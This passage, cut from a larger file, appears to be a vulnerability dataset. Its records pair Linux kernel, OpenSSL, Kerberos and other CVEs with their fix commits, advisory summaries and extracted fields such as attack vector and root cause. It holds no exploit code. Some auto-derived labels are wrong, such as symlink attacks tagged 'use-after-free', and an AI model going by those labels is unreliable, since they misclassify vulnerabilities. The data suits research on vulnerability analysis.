attacker"},{"commit_id":"ee53664bda169f519ce3c6a22d378f0b946c8178","cve_id":"CVE-2014-8173","cwe_id":null,"commit_message":"mm: Fix NULL pointer dereference in madvise(MADV_WILLNEED) support\n\nSasha Levin found a NULL pointer dereference that is due to a missing\npage table lock, which in turn is due to the pmd entry in question being\na transparent huge-table entry.\n\nThe code - introduced in commit 1998cc048901 (\"mm: make\nmadvise(MADV_WILLNEED) support swap file prefetch\") - correctly checks\nfor this situation using pmd_none_or_trans_huge_or_clear_bad(), but it\nturns out that that function doesn't work correctly.\n\npmd_none_or_trans_huge_or_clear_bad() expected that pmd_bad() would\ntrigger if the transparent hugepage bit was set, but it doesn't do that\nif pmd_numa() is also set. Note that the NUMA bit only gets set on real\nNUMA machines, so people trying to reproduce this on most normal\ndevelopment systems would never actually trigger this.\n\nFix it by removing the very subtle (and subtly incorrect) expectation,\nand instead just checking pmd_trans_huge() explicitly.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com>\nAcked-by: Andrea Arcangeli <aarcange@redhat.com>\n[ Additionally remove the now stale test for pmd_trans_huge() inside the\n  pmd_bad() case - Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The pmd_none_or_trans_huge_or_clear_bad function in include\/asm-generic\/pgtable.h in the Linux kernel before 3.13 on NUMA systems does not properly determine whether a Page Middle Directory (PMD) entry is a transparent huge-table entry, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted MADV_WILLNEED madvise system call that leverages the absence of a page-table lock.","commit_message_1":"fix null pointer dereference in madvise ( madv_willneed ) support sasha levin found a null pointer dereference that is due to a missing page table lock , which in turn is due to the pmd entry in question being a transparent huge-table entry","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted madv _ willneed madvise system call that leverages the absence","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not properly determine whether a page middle directory ( pmd ) entry is a transparent huge - table entry ","Attack Type":"local attacker"},{"commit_id":"eee5cc2702929fd41cce28058dc6d6717f723f87","cve_id":"CVE-2014-8172","cwe_id":"CWE-17","commit_message":"get rid of s_files and files_lock\n\nThe only thing we need it for is alt-sysrq-r (emergency remount r\/o)\nand these days we can do just as well without going through the\nlist of files.\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The filesystem implementation in the Linux kernel before 3.13 performs certain operations on lists of files with an inappropriate locking approach, which allows local users to cause a denial of service (soft lockup or system crash) via unspecified use of Asynchronous I\/O (AIO) operations.","commit_message_1":"get rid of s_files and files_lock the only thing we need it for is alt-sysrq-r ( emergency remount r\/o ) and these day we can do just a well without going through the list of file","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via unspecified use of asynchronous i \/ o ( aio ) operations","Impact":"cause a denial of service ( soft lockup or system crash )","Root Cause":"caused by a soft lockup when performing Asynchronous I\/O operations due to files_lock excessive locking","Attack Type":"local attacker"},{"commit_id":"db29a9508a9246e77087c5531e45b2c88ec6988b","cve_id":"CVE-2014-8160","cwe_id":"CWE-254","commit_message":"netfilter: conntrack: disable generic tracking for known protocols\n\nGiven following iptables ruleset:\n\n-P FORWARD DROP\n-A FORWARD -m sctp --dport 9 -j ACCEPT\n-A FORWARD -p tcp --dport 80 -j ACCEPT\n-A FORWARD -p tcp -m conntrack -m state ESTABLISHED,RELATED -j ACCEPT\n\nOne would assume that this allows SCTP on port 9 and TCP on port 80.\nUnfortunately, if the SCTP conntrack module is not loaded, this allows\n*all* SCTP communication, to pass though, i.e. -p sctp -j ACCEPT,\nwhich we think is a security issue.\n\nThis is because on the first SCTP packet on port 9, we create a dummy\n\"generic l4\" conntrack entry without any port information (since\nconntrack doesn't know how to extract this information).\n\nAll subsequent packets that are unknown will then be in established\nstate since they will fallback to proto_generic and will match the\n'generic' entry.\n\nOur originally proposed version [1] completely disabled generic protocol\ntracking, but Jozsef suggests to not track protocols for which a more\nsuitable helper is available, hence we now mitigate the issue for in\ntree known ct protocol helpers only, so that at least NAT and direction\ninformation will still be preserved for others.\n\n [1] http:\/\/www.spinics.net\/lists\/netfilter-devel\/msg33430.html\n\nJoint work with Daniel Borkmann.\n\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nAcked-by: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"net\/netfilter\/nf_conntrack_proto_generic.c in the Linux kernel before 3.18 generates incorrect conntrack entries during handling of certain iptables rule sets for the SCTP, DCCP, GRE, and UDP-Lite protocols, which allows remote attackers to bypass intended access restrictions via packets with disallowed port numbers.","commit_message_1":"conntrack : disable generic tracking for known protocol given following iptables ruleset : -p forward drop -a forward -m sctp -- dport <number> -j accept -a forward -p tcp -- dport <number> -j accept -a forward -p tcp -m conntrack -m state established , related -j accept one would assume that this allows sctp on port <number> and tcp on port <number>","Vulnerability Type":"Security Features","Attack Vector":"restrictions via packets with disallowed port numbers","Impact":"bypass security restrictions","Root Cause":"generates incorrect conntrack entries during handling of certain iptables rule sets for the sctp , dccp , gre , and udp - lite protocols","Attack Type":"remote attacker"},{"commit_id":"8d0207652cbe27d1f962050737848e5ad4671958","cve_id":"CVE-2014-7822","cwe_id":"CWE-264","commit_message":"->splice_write() via ->write_iter()\n\niter_file_splice_write() - a ->splice_write() instance that gathers the\npipe buffers, builds a bio_vec-based iov_iter covering those and feeds\nit to ->write_iter().  A bunch of simple cases coverted to that...\n\n[AV: fixed the braino spotted by Cyrill]\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The implementation of certain splice_write file operations in the Linux kernel before 3.16 does not enforce a restriction on the maximum size of a single file, which allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted splice system call, as demonstrated by use of a file descriptor associated with an ext4 filesystem.","commit_message_1":"- > splice_write ( ) via - > write_iter ( ) iter_file_splice_write ( ) - a - > splice_write ( ) instance that gather the pipe buffer , build a bio_vec-based iov_iter covering those and feed it to - > write_iter ( )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted splice system call , as demonstrated by use of a file descriptor associated with an ext4 filesystem","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"does not enforce a restriction on the maximum size of a single file","Attack Type":"local attacker"},{"commit_id":"102bb6ebf20f9174130c85c3b052ae104e5073ec","cve_id":"CVE-2014-5355","cwe_id":null,"commit_message":"Fix krb5_read_message handling [CVE-2014-5355]\n\nIn recvauth_common, do not use strcmp against the data fields of\nkrb5_data objects populated by krb5_read_message(), as there is no\nguarantee that they are C strings.  Instead, create an expected\nkrb5_data value and use data_eq().\n\nIn the sample user-to-user server application, check that the received\nclient principal name is null-terminated before using it with printf\nand krb5_parse_name.\n\nCVE-2014-5355:\n\nIn MIT krb5, when a server process uses the krb5_recvauth function, an\nunauthenticated remote attacker can cause a NULL dereference by\nsending a zero-byte version string, or a read beyond the end of\nallocated storage by sending a non-null-terminated version string.\nThe example user-to-user server application (uuserver) is similarly\nvulnerable to a zero-length or non-null-terminated principal name\nstring.\n\nThe krb5_recvauth function reads two version strings from the client\nusing krb5_read_message(), which produces a krb5_data structure\ncontaining a length and a pointer to an octet sequence.  krb5_recvauth\nassumes that the data pointer is a valid C string and passes it to\nstrcmp() to verify the versions.  If the client sends an empty octet\nsequence, the data pointer will be NULL and strcmp() will dereference\na NULL pointer, causing the process to crash.  If the client sends a\nnon-null-terminated octet sequence, strcmp() will read beyond the end\nof the allocated storage, possibly causing the process to crash.\n\nuuserver similarly uses krb5_read_message() to read a client principal\nname, and then passes it to printf() and krb5_parse_name() without\nverifying that it is a valid C string.\n\nThe krb5_recvauth function is used by kpropd and the Kerberized\nversions of the BSD rlogin and rsh daemons.  These daemons are usually\nrun out of inetd or in a mode which forks before processing incoming\nconnections, so a process crash will generally not result in a\ncomplete denial of service.\n\nThanks to Tim Uglow for discovering this issue.\n\nCVSSv2: AV:N\/AC:L\/Au:N\/C:N\/I:N\/A:P\/E:POC\/RL:OF\/RC:C\n\n[tlyu@mit.edu: CVSS score]\n\nticket: 8050 (new)\ntarget_version: 1.13.1\ntags: pullup","summary":"MIT Kerberos 5 (aka krb5) through 1.13.1 incorrectly expects that a krb5_read_message data field is represented as a string ending with a '0' character, which allows remote attackers to (1) cause a denial of service (NULL pointer dereference) via a zero-byte version string or (2) cause a denial of service (out-of-bounds read) by omitting the '0' character, related to appl\/user_user\/server.c and lib\/krb5\/krb\/recvauth.c.","commit_message_1":"fix krb5_read_message handling [ <cve_id> ] in recvauth_common , do not use strcmp against the data field of krb5_data object populated by krb5_read_message ( ) , a there is no guarantee that they are c string","Vulnerability Type":"out-of-bounds read","Attack Vector":"via a zero - byte version string or ( 2 ) cause a denial of service ( out - of - bounds read ) by omitting the ' 0 ' character , related to appl \/ user _ user \/ server . c and lib \/ krb5 \/ krb \/ recvauth","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"is represented as a string ending with a ' 0 ' character","Attack Type":"remote attacker"},{"commit_id":"82dc33da50338ac84c7b4102dc6513d897d0506a","cve_id":"CVE-2014-5352","cwe_id":null,"commit_message":"Fix gss_process_context_token() [CVE-2014-5352]\n\n[MITKRB5-SA-2015-001] The krb5 gss_process_context_token() should not\nactually delete the context; that leaves the caller with a dangling\npointer and no way to know that it is invalid.  Instead, mark the\ncontext as terminated, and check for terminated contexts in the GSS\nfunctions which expect established contexts.  Also add checks in\nexport_sec_context and pseudo_random, and adjust t_prf.c for the\npseudo_random check.\n\nticket: 8055 (new)\ntarget_version: 1.13.1\ntags: pullup","summary":"The krb5_gss_process_context_token function in lib\/gssapi\/krb5\/process_context_token.c in the libgssapi_krb5 library in MIT Kerberos 5 (aka krb5) through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 does not properly maintain security-context handles, which allows remote authenticated users to cause a denial of service (use-after-free and double free, and daemon crash) or possibly execute arbitrary code via crafted GSSAPI traffic, as demonstrated by traffic to kadmind.","commit_message_1":"fix gss_process_context_token ( ) [ <cve_id> ] [ mitkrb5-sa-<number>-<number> ] the krb5 gss_process_context_token ( ) should not actually delete the context ; that leaf the caller with a dangling pointer and no way to know that it is invalid","Vulnerability Type":"use-after-free","Attack Vector":"via crafted GSSAPI traffic","Impact":"cause a denial of service (use-after-free and double free, and daemon crash)","Root Cause":"does not properly maintain security - context handles","Attack Type":"remote attacker"},{"commit_id":"b15f8769644b00ef7283521593360b7b2135cb63","cve_id":"CVE-2014-3572","cwe_id":"CWE-310","commit_message":"ECDH downgrade bug fix.\n\nFix bug where an OpenSSL client would accept a handshake using an\nephemeral ECDH ciphersuites with the server key exchange message omitted.\n\nThanks to Karthikeyan Bhargavan for reporting this issue.\n\nCVE-2014-3572\nReviewed-by: Matt Caswell <matt@openssl.org>","summary":"The ssl3_get_key_exchange function in s3_clnt.c in OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k allows remote SSL servers to conduct ECDHE-to-ECDH downgrade attacks and trigger a loss of forward secrecy by omitting the ServerKeyExchange message.","commit_message_1":"ecdh downgrade bug fix","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by omitting the serverkeyexchange message .","Impact":"conduct ecdhe - to - ecdh downgrade attacks and trigger a loss of forward secrecy","Root Cause":"conduct ECDHE-to-ECDH downgrade attacks and trigger a loss of forward secrecy","Attack Type":"remote attacker"},{"commit_id":"248385c606620b29ecc96ca9d3603463f879652b","cve_id":"CVE-2014-3571","cwe_id":null,"commit_message":"Follow on from CVE-2014-3571. This fixes the code that was the original source\nof the crash due to p being NULL. Steve's fix prevents this situation from\noccuring - however this is by no means obvious by looking at the code for\ndtls1_get_record. This fix just makes things look a bit more sane.\n\nReviewed-by: Dr Stephen Henson <steve@openssl.org>","summary":"OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted DTLS message that is processed with a different read operation for the handshake header than for the handshake body, related to the dtls1_get_record function in d1_pkt.c and the ssl3_read_n function in s3_pkt.c.","commit_message_1":"follow on from <cve_id>","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted dtls message that is processed with a different read operation for the handshake header than for the handshake body , related to the dtls1 _ get _ record function in d1 _ pkt","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference when handling malicious messages","Attack Type":"remote attacker"},{"commit_id":"a7a44ba55cb4f884c6bc9ceac90072dea38e66d0","cve_id":"CVE-2014-3570","cwe_id":"CWE-310","commit_message":"Fix for CVE-2014-3570 (with minor bn_asm.c revamp).\n\nReviewed-by: Emilia Kasper <emilia@openssl.org>","summary":"The BN_sqr implementation in OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k does not properly calculate the square of a BIGNUM value, which might make it easier for remote attackers to defeat cryptographic protection mechanisms via unspecified vectors, related to crypto\/bn\/asm\/mips.pl, crypto\/bn\/asm\/x86_64-gcc.c, and crypto\/bn\/bn_asm.c.","commit_message_1":"fix for <cve_id> ( with minor <file> revamp )","Vulnerability Type":"Cryptographic Issues","Attack Vector":"via unspecified vectors , related to crypto \/ bn \/ asm \/ mips . pl , crypto \/ bn \/ asm \/ x86 _ 64 - gcc . c , and crypto \/ bn \/ bn _ asm . c .","Impact":"defeat cryptographic protection mechanisms","Root Cause":"does not properly calculate the square of a bignum value , which might","Attack Type":"remote attacker"},{"commit_id":"e9bedb644d106a043e33e1058bedd1c2c0b2e2e0","cve_id":"CVE-2014-3148","cwe_id":"CWE-79","commit_message":"Escape error page content\n\nCredit to Kenneth F. Belva (https:\/\/twitter.com\/infosecmaverick)\nhttps:\/\/hackerone.com\/reports\/3317","summary":"Cross-site scripting (XSS) vulnerability in libahttp\/err.c in OkCupid OKWS (OK Web Server) allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO to a non-existent page, which is not properly handled in a 404 error page.","commit_message_1":"escape error page content credit to kenneth f","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via the path _ info to a non - existent page , which is not properly handled in a 404 error page","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input by the server error pages","Attack Type":"remote attacker"},{"commit_id":"94428057c602da3d6d34ef75c78091066ecac5c0","cve_id":"CVE-2014-1832","cwe_id":null,"commit_message":"Fix a symlink-related security vulnerability.\n\nThe fix in commit 34b10878 and contained a small attack time window in\nbetween two filesystem operations. This has been fixed.","summary":"Phusion Passenger 4.0.37 allows local users to write to certain files and directories via a symlink attack on (1) control_process.pid or a (2) generation-* file.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-1831.","commit_message_1":"fix a symlink-related security vulnerability","Vulnerability Type":"use-after-free","Attack Vector":"via a symlink attack on ( 1 ) control _ process . pid or a ( 2 ) generation - * file","Impact":"write to certain files and directories","Root Cause":"caused by an incomplete fix related to a race condition error when temporary files are created insecurely","Attack Type":"local attacker"},{"commit_id":"34b1087870c2","cve_id":"CVE-2014-1831","cwe_id":null,"commit_message":"Fix low-urgency security vulnerability: writing files to arbitrary directory by hijacking temp directories.","summary":"Phusion Passenger before 4.0.37 allows local users to write to certain files and directories via a symlink attack on (1) control_process.pid or a (2) generation-* file.","commit_message_1":"writing file to arbitrary directory by hijacking temp directory","Vulnerability Type":"use-after-free","Attack Vector":"via a symlink attack on ( 1 ) control _ process . pid or a ( 2 ) generation - * file","Impact":"write to certain files and directories","Root Cause":"Temporary files are created insecurely","Attack Type":"local attacker"},{"commit_id":"7d267278a9ece963d77eefec61630223fce08c6c","cve_id":"CVE-2013-7446","cwe_id":null,"commit_message":"unix: avoid use-after-free in ep_remove_wait_queue\n\nRainer Weikusat <rweikusat@mobileactivedefense.com> writes:\nAn AF_UNIX datagram socket being the client in an n:1 association with\nsome server socket is only allowed to send messages to the server if the\nreceive queue of this socket contains at most sk_max_ack_backlog\ndatagrams. This implies that prospective writers might be forced to go\nto sleep despite none of the message presently enqueued on the server\nreceive queue were sent by them. In order to ensure that these will be\nwoken up once space becomes again available, the present unix_dgram_poll\nroutine does a second sock_poll_wait call with the peer_wait wait queue\nof the server socket as queue argument (unix_dgram_recvmsg does a wake\nup on this queue after a datagram was received). This is inherently\nproblematic because the server socket is only guaranteed to remain alive\nfor as long as the client still holds a reference to it. In case the\nconnection is dissolved via connect or by the dead peer detection logic\nin unix_dgram_sendmsg, the server socket may be freed despite \"the\npolling mechanism\" (in particular, epoll) still has a pointer to the\ncorresponding peer_wait queue. There's no way to forcibly deregister a\nwait queue with epoll.\n\nBased on an idea by Jason Baron, the patch below changes the code such\nthat a wait_queue_t belonging to the client socket is enqueued on the\npeer_wait queue of the server whenever the peer receive queue full\ncondition is detected by either a sendmsg or a poll. A wake up on the\npeer queue is then relayed to the ordinary wait queue of the client\nsocket via wake function. The connection to the peer wait queue is again\ndissolved if either a wake up is about to be relayed or the client\nsocket reconnects or a dead peer is detected or the client socket is\nitself closed. This enables removing the second sock_poll_wait from\nunix_dgram_poll, thus avoiding the use-after-free, while still ensuring\nthat no blocked writer sleeps forever.\n\nSigned-off-by: Rainer Weikusat <rweikusat@mobileactivedefense.com>\nFixes: ec0d215f9420 (\"af_unix: fix 'poll for write'\/connected DGRAM sockets\")\nReviewed-by: Jason Baron <jbaron@akamai.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Use-after-free vulnerability in net\/unix\/af_unix.c in the Linux kernel before 4.3.3 allows local users to bypass intended AF_UNIX socket permissions or cause a denial of service (panic) via crafted epoll_ctl calls.","commit_message_1":"avoid use-after-free in ep_remove_wait_queue rainer weikusat < rweikusat @ <file> > writes : an af_unix datagram socket being the client in an n : <number> association with some server socket is only allowed to send message to the server if the receive queue of this socket contains at most sk_max_ack_backlog datagrams","Vulnerability Type":"use - after - free","Attack Vector":"via crafted epoll _ ctl calls ","Impact":"bypass intended af _ unix socket permissions or cause a denial of service ( panic )","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"741495cb08503fd32a9d22648e63b64390c601f4","cve_id":"CVE-2013-7441","cwe_id":"CWE-399","commit_message":"nbd-server: handle modern-style negotiation in a child process\n\nPreviously, the modern style negotiation was carried out in the root\nserver (listener) process before forking the actual client handler. This\nmade it possible for a malfunctioning or evil client to terminate the\nroot process simply by querying a non-existent export or aborting in the\nmiddle of the negotation process (caused SIGPIPE in the server).\n\nThis commit moves the negotiation process to the child to keep the root\nprocess up and running no matter what happens during the negotiation.\n\nSee http:\/\/sourceforge.net\/mailarchive\/message.php?msg_id=30410146\n\nSigned-off-by: Tuomas R\u00e4s\u00e4nen <tuomasjjrasanen@tjjr.fi>","summary":"The modern style negotiation in Network Block Device (nbd-server) 2.9.22 through 3.3 allows remote attackers to cause a denial of service (root process termination) by (1) closing the connection during negotiation or (2) specifying a name for a non-existent export.","commit_message_1":"handle modern-style negotiation in a child process previously , the modern style negotiation wa carried out in the root server ( listener ) process before forking the actual client handler","Vulnerability Type":"Resource Management Errors","Attack Vector":"by closing the connection during negotiation or specifying a name for a non-existent export","Impact":"cause a denial of service ( root process termination ) by closing the connection during negotiation or specifying a name for a non - existent export","Root Cause":"caused by the failure to use signal handlers correctly","Attack Type":"remote attacker"},{"commit_id":"128394eff343fc6d2f32172f03e24829539c5835","cve_id":"CVE-2016-10088","cwe_id":"CWE-416","commit_message":"sg_write()\/bsg_write() is not fit to be called under KERNEL_DS\n\nBoth damn things interpret userland pointers embedded into the payload;\nworse, they are actually traversing those.  Leaving aside the bad\nAPI design, this is very much _not_ safe to call with KERNEL_DS.\nBail out early if that happens.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The sg implementation in the Linux kernel through 4.9 does not properly restrict write operations in situations where the KERNEL_DS option is set, which allows local users to read or write to arbitrary kernel memory locations or cause a denial of service (use-after-free) by leveraging access to a \/dev\/sg device, related to block\/bsg.c and drivers\/scsi\/sg.c.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-9576.","commit_message_1":"sg_write ( ) \/bsg_write ( ) is not fit to be called under kernel_ds both damn thing interpret userland pointer embedded into the payload ; worse , they are actually traversing those","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging access to a \/ dev \/ sg device , related to block \/ bsg . c and drivers \/ scsi \/ sg . c","Impact":"read or write to arbitrary kernel memory locations or cause a denial of service ( use - after - free )","Root Cause":"does not properly restrict write operations","Attack Type":"local attacker"},{"commit_id":"79dc7e3f1cd323be4c81aa1a94faa1b3ed987fb2","cve_id":"CVE-2016-9919","cwe_id":"CWE-20","commit_message":"net: handle no dst on skb in icmp6_send\n\nAndrey reported the following while fuzzing the kernel with syzkaller:\n\nkasan: CONFIG_KASAN_INLINE enabled\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN\nModules linked in:\nCPU: 0 PID: 3859 Comm: a.out Not tainted 4.9.0-rc6+ #429\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\ntask: ffff8800666d4200 task.stack: ffff880067348000\nRIP: 0010:[<ffffffff833617ec>]  [<ffffffff833617ec>]\nicmp6_send+0x5fc\/0x1e30 net\/ipv6\/icmp.c:451\nRSP: 0018:ffff88006734f2c0  EFLAGS: 00010206\nRAX: ffff8800666d4200 RBX: 0000000000000000 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: dffffc0000000000 RDI: 0000000000000018\nRBP: ffff88006734f630 R08: ffff880064138418 R09: 0000000000000003\nR10: dffffc0000000000 R11: 0000000000000005 R12: 0000000000000000\nR13: ffffffff84e7e200 R14: ffff880064138484 R15: ffff8800641383c0\nFS:  00007fb3887a07c0(0000) GS:ffff88006cc00000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000020000000 CR3: 000000006b040000 CR4: 00000000000006f0\nStack:\n ffff8800666d4200 ffff8800666d49f8 ffff8800666d4200 ffffffff84c02460\n ffff8800666d4a1a 1ffff1000ccdaa2f ffff88006734f498 0000000000000046\n ffff88006734f440 ffffffff832f4269 ffff880064ba7456 0000000000000000\nCall Trace:\n [<ffffffff83364ddc>] icmpv6_param_prob+0x2c\/0x40 net\/ipv6\/icmp.c:557\n [<     inline     >] ip6_tlvopt_unknown net\/ipv6\/exthdrs.c:88\n [<ffffffff83394405>] ip6_parse_tlv+0x555\/0x670 net\/ipv6\/exthdrs.c:157\n [<ffffffff8339a759>] ipv6_parse_hopopts+0x199\/0x460 net\/ipv6\/exthdrs.c:663\n [<ffffffff832ee773>] ipv6_rcv+0xfa3\/0x1dc0 net\/ipv6\/ip6_input.c:191\n ...\n\nicmp6_send \/ icmpv6_send is invoked for both rx and tx paths. In both\ncases the dst->dev should be preferred for determining the L3 domain\nif the dst has been set on the skb. Fallback to the skb->dev if it has\nnot. This covers the case reported here where icmp6_send is invoked on\nRx before the route lookup.\n\nFixes: 5d41ce29e (\"net: icmp6_send should use dst dev to determine L3 domain\")\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David Ahern <dsa@cumulusnetworks.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The icmp6_send function in net\/ipv6\/icmp.c in the Linux kernel through 4.8.12 omits a certain check of the dst data structure, which allows remote attackers to cause a denial of service (panic) via a fragmented IPv6 packet.","commit_message_1":"handle no dst on skb in icmp6_send andrey reported the following while fuzzing the kernel with syzkaller : kasan : config_kasan_inline enabled kasan : gpf could be caused by null-ptr deref or user memory access general protection fault : <number> [ # <number> ] smp kasan module linked in : cpu : <number> pid : <number> comm : <file> not tainted <file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a fragmented ipv6 packet","Impact":"cause a denial of service ( panic )","Root Cause":"omits a certain check of the dst data structure","Attack Type":"remote attacker"},{"commit_id":"95a8351a75758cf10b3bf6abae0b6b461f90d9e5","cve_id":"CVE-2016-9888","cwe_id":"CWE-476","commit_message":"tar: fix crash on broken tar file.","summary":"An error within the *tar_directory_for_file()* function (gsf-infile-tar.c) in GNOME Structured File Library before 1.14.41 can be exploited to trigger a Null pointer dereference and subsequently cause a crash via a crafted TAR file.","commit_message_1":"tar : fix crash on broken tar file","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a malformed TAR file","Impact":"cause a denial of service","Root Cause":"caused by NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"92964c79b357efd980812c4de5c1fd2ec8bb5520","cve_id":"CVE-2016-9806","cwe_id":"CWE-415","commit_message":"netlink: Fix dump skb leak\/double free\n\nWhen we free cb->skb after a dump, we do it after releasing the\nlock.  This means that a new dump could have started in the time\nbeing and we'll end up freeing their skb instead of ours.\n\nThis patch saves the skb and module before we unlock so we free\nthe right memory.\n\nFixes: 16b304f3404f (\"netlink: Eliminate kmalloc in netlink dump operation.\")\nReported-by: Baozeng Ding <sploving1@gmail.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\nAcked-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in the netlink_dump function in net\/netlink\/af_netlink.c in the Linux kernel before 4.6.3 allows local users to cause a denial of service (double free) or possibly have unspecified other impact via a crafted application that makes sendmsg system calls, leading to a free operation associated with a new dump that started earlier than anticipated.","commit_message_1":"fix dump skb leak\/double free when we free cb- > skb after a dump , we do it after releasing the lock","Vulnerability Type":"double free","Attack Vector":"via a crafted application that makes sendmsg system calls , leading to a free operation associated with a new dump that started earlier than anticipated","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"3aa02cb664c5fb1042958c8d1aa8c35055a2ebc4","cve_id":"CVE-2016-9794","cwe_id":"CWE-416","commit_message":"ALSA: pcm : Call kill_fasync() in stream lock\n\nCurrently kill_fasync() is called outside the stream lock in\nsnd_pcm_period_elapsed().  This is potentially racy, since the stream\nmay get released even during the irq handler is running.  Although\nsnd_pcm_release_substream() calls snd_pcm_drop(), this doesn't\nguarantee that the irq handler finishes, thus the kill_fasync() call\noutside the stream spin lock may be invoked after the substream is\ndetached, as recently reported by KASAN.\n\nAs a quick workaround, move kill_fasync() call inside the stream\nlock.  The fasync is rarely used interface, so this shouldn't have a\nbig impact from the performance POV.\n\nIdeally, we should implement some sync mechanism for the proper finish\nof stream and irq handler.  But this oneliner should suffice for most\ncases, so far.\n\nReported-by: Baozeng Ding <sploving1@gmail.com>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Race condition in the snd_pcm_period_elapsed function in sound\/core\/pcm_lib.c in the ALSA subsystem in the Linux kernel before 4.7 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted SNDRV_PCM_TRIGGER_START command.","commit_message_1":"pcm : call kill_fasync ( ) in stream lock currently kill_fasync ( ) is called outside the stream lock in snd_pcm_period_elapsed ( )","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted sndrv _ pcm _ trigger _ start command","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by an use-after-free error","Attack Type":"local attacker"},{"commit_id":"b98b0bc8c431e3ceb4b26b0dfc8db509518fb290","cve_id":"CVE-2016-9793","cwe_id":"CWE-119","commit_message":"net: avoid signed overflows for SO_{SND|RCV}BUFFORCE\n\nCAP_NET_ADMIN users should not be allowed to set negative\nsk_sndbuf or sk_rcvbuf values, as it can lead to various memory\ncorruptions, crashes, OOM...\n\nNote that before commit 82981930125a (\"net: cleanups in\nsock_setsockopt()\"), the bug was even more serious, since SO_SNDBUF\nand SO_RCVBUF were vulnerable.\n\nThis needs to be backported to all known linux kernels.\n\nAgain, many thanks to syzkaller team for discovering this gem.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sock_setsockopt function in net\/core\/sock.c in the Linux kernel before 4.8.14 mishandles negative values of sk_sndbuf and sk_rcvbuf, which allows local users to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability for a crafted setsockopt system call with the (1) SO_SNDBUFFORCE or (2) SO_RCVBUFFORCE option.","commit_message_1":"avoid signed overflow for so_ { snd|rcv } bufforce cap_net_admin user should not be allowed to set negative sk_sndbuf or sk_rcvbuf value , a it can lead to various memory corruption , crash , oom","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the cap _ net _ admin capability for a crafted setsockopt system call with the ( 1 ) so _ sndbufforce or ( 2 ) so _ rcvbufforce option","Impact":"cause a denial of service ( memory corruption and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"81cdb259fb6d8c1c4ecfeea389ff5a73c07f5755","cve_id":"CVE-2016-9777","cwe_id":"CWE-125","commit_message":"KVM: x86: fix out-of-bounds accesses of rtc_eoi map\n\nKVM was using arrays of size KVM_MAX_VCPUS with vcpu_id, but ID can be\nbigger that the maximal number of VCPUs, resulting in out-of-bounds\naccess.\n\nFound by syzkaller:\n\n  BUG: KASAN: slab-out-of-bounds in __apic_accept_irq+0xb33\/0xb50 at addr [...]\n  Write of size 1 by task a.out\/27101\n  CPU: 1 PID: 27101 Comm: a.out Not tainted 4.9.0-rc5+ #49\n  Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n   [...]\n  Call Trace:\n   [...] __apic_accept_irq+0xb33\/0xb50 arch\/x86\/kvm\/lapic.c:905\n   